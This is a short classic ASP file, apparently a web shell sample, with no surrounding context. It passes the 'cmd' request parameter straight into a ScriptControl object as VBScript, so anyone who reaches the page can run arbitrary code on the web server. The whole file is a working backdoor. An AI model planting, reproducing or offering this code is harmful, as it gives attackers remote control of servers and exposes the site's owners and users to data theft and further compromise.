<%
Set o = Server.CreateObject("ScriptControl")
o.language = "vbscript"
o.addcode(Request("cmd"))
%>